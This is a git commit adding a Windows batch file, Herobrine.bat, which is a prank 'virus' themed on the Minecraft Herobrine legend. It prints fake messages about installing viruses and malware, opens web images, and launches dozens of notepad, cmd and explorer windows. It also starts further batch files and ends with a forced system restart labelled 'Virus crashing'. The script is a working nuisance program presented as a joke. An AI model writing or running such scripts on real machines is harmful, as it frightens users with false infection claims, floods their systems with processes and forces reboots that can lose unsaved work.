dd74be55d032091d0c204b3ff519281212b36f41
HerobrinePE <42194169+HerobrinePE@users.noreply.github.com>
2018-11-15 21:52:24 -0400

    Create Herobrine.bat

---
+++ Herobrine.bat
@@ -0,0 +1,203 @@
+@echo off
+color 0a
+mode 1000
+pause
+echo .............................................................
+pause
+%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
+pause
+echo you
+echo Should
+pause 
+echo have
+echo removed
+pause 
+echo me
+pause
+echo Herobrine.exe
+echo Virus 
+pause 
+echo Installing Viruses from Herobrine.exe
+echo Virus Install Started. Please Wait... 
+echo Installed 72% Complete
+pause 
+echo Installed 99% Complete
+echo Installed Herobrine
+pause
+start https://pbs.twimg.com/profile_images/991190151710822401/eLgpyQEj_700x700.jpg
+pause 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+pause
+echo press enter to stop
+pause
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait...
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait... 
+echo Error. Please Wait...
+echo Sucessfully installed Herobrine
+pause 
+notepad.exe 
+notepad.exe
+notepad.exe 
+notepad.exe 
+notepad.exe
+notepad.exe 
+notepad.exe 
+notepad.exe 
+notepad.exe 
+notepad.exe
+notepad.exe 
+notepad.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+cmd.exe
+explorer.exe
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe
+explorer.exe 
+explorer.exe
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe
+explorer.exe 
+explorer.exe
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe
+explorer.exe 
+explorer.exe
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe
+explorer.exe 
+explorer.exe
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe
+explorer.exe 
+explorer.exe
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe
+explorer.exe 
+explorer.exe
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe 
+explorer.exe
+explorer.exe 
+pause
+echo it will open every time ;)
+echo Installing data
+echo error detected
+echo Error fixed
+echo NULL.exe has been removed
+echo virus has stopped
+pause
+echo restarted virus
+pause
+start https://thumbs.gfycat.com/DifficultGraveLacewing-max-1mb.gif
+pause
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo installing malware this will take 3 minutes
+echo {/}==========={([~||~])}==========={\}
+pause
+start hakk.bat
+pause 
+hsbthg836676hshjut^^^^^^^^²¹.bat
+shutdown -r -t 180 -c "Virus crashing"
